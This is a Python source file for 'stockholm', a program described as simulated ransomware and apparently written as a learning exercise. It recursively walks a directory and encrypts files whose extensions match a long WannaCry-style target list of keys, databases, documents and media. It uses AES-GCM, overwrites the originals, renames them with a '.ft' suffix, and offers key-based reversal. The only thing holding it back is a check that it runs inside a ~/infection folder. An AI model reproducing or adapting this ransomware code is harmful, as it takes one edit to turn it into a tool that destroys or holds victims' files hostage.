import argparse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from pathlib import Path
from colorama import Fore, Style
import os

KEY = ""
# os.urandom(16+)
SALT = b''
# os.urandom(12)
IV = b''
EXTENSION = [
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm",
    ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", "sxm",
    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd",
    ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".psl",
    ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3",
    ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv",
    ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png",
    ".bmp", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC",
    ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".edb", ".potm", ".potx",
    ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm",
    ".dotx", ".dotm", ".dot", ".docm", ".docb", ".jpg", "jpeg", ".snt", ".onetoc2", ".dwg", ".pdf", ".wkl", ".wks", ".123",
    ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".eml", ".msg", ".ost", ".pst", ".pptx", ".ppt", ".xlsx", ".xls", ".docx", ".doc"
    ]

DESCRIPTION = '''\
-----------------------------------------------------------------------------------------------------------
Discription:
 A simulated malware program that mimics ransomware behavior by encrypting all files 
 in a target directory. The program can also reverse the encryption using a provided key.
-----------------------------------------------------------------------------------------------------------'''

EPILOG = '''\
-----------------------------------------------------------------------------------------------------------
• The target directory must be named "infection" and located within the user’s HOME directory.
• The provided key must be at least 16 characters long.
• This program targets common file extensions associated with ransomware like WannaCry.
-----------------------------------------------------------------------------------------------------------'''

def main() -> int:
    try:
        args = arguments_parser()
        called_path = Path('.')
        if called_path.cwd() != Path(os.environ["HOME"] + "/infection"):
            return error("invalid called path directory.", 1)
        if args.reverse:
            if len(args.reverse) < 16:
                return error("Invalid key format.", 1)
            recusive_directory_and(decryption, called_path, args.silent, args.reverse.encode('utf-8'))
        else:
            key = args.key if args.key else KEY
            if len(key) < 16:
                return error("Invalid key format.", 1)
            recusive_directory_and(encryption, called_path, args.silent, key.encode('utf-8'))
    except Exception as e:
        return error(e, 1)
    except KeyboardInterrupt:
        return 1
    return 0

def key_derivation(key: str):
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                    length=32,
                    salt=SALT,
                    iterations=100_000, 
                    )
    return kdf.derive(key)

def recusive_directory_and(func, directory: Path, silent: bool, key: str) -> None:
    for item in directory.iterdir():
        if item.is_file():
            func(item, key, silent)
        else:
            if not silent:
                print(f"{Fore.YELLOW}[directory]{Style.RESET_ALL} {item.absolute()}")
            recusive_directory_and(func, item, silent, key)

def encryption(file: Path, key: str, silent: bool):
    try:
        if (file.suffix in EXTENSION):
            hkey = key_derivation(key)
            with open(file, 'br') as f:
                content = f.read()
            cipher = AESGCM(hkey)
            encrypted = cipher.encrypt(IV, content, None)
            with open(file, 'bw') as f:
                f.write(encrypted);
            if not silent:
                print(f"{Fore.BLUE}[encrytped] {Fore.GREEN}{file.name}{Style.RESET_ALL} -> {Fore.RED}{file.name}.ft{Style.RESET_ALL}")
            file.rename(f"{file.absolute()}.ft")
    except Exception as e:
        return error(e, 1);
    return

def decryption(file: Path, key: str, silent: bool):
    try:
        if (file.suffix == ".ft"):
            hkey = key_derivation(key)
            with open(file, 'br') as f:
                encrypted = f.read()
            cipher = AESGCM(hkey)
            content = cipher.decrypt(IV, encrypted, None)
            with open(file, 'bw') as f:
                f.write(content)
            file_name = str(file.absolute())[:-3];
            file.rename(file_name)
            if not silent:
                print(f"{Fore.BLUE}[decrytped] {Fore.RED}{file.name}{Style.RESET_ALL} -> {Fore.GREEN}{file.name[:-3]}{Style.RESET_ALL}")
    except Exception as e:
        pass
    return

def arguments_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog="stockholm", formatter_class=argparse.RawDescriptionHelpFormatter,
        description=DESCRIPTION, epilog=EPILOG)
    parser.add_argument("-v", "--version", action="version", version="%(prog)s v.1.0.142",
                        help="Show the version of the program.")
    parser.add_argument("-s", "--silent", action="store_true",
                        help="Run the program without producing any log output." )
    parser.add_argument("-r", "--reverse", type=str, metavar="KEY",
                        help="Reverse the encryption using the given key.")
    parser.add_argument("key", type=str, metavar="KEY", nargs='?' )
    return parser.parse_args()


def error(message: str, code: int=None):
    print(f"stockholm: error: {message}")
    return code

if __name__ == "__main__":
    main()